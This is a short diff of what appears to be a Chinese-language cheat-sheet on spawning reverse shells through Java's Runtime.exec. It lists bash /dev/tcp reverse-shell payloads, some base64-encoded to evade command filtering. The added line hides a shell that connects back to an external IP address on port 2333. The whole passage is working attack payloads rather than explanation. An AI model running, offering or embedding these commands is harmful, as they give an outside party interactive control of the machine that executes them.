@@ -27,6 +27,7 @@ Runtime.getRuntime().exec("bash -i >& /dev/tcp/ip/port 0>&1");
 bash -i >& /dev/tcp/ip/port 0>&1 需要base64编码再执行下面：
 
 bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}
+bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjkyLjg4LjI0Ny8yMzMzIDA+JjE=" | base64 -d | bash -i
 ```
 
 
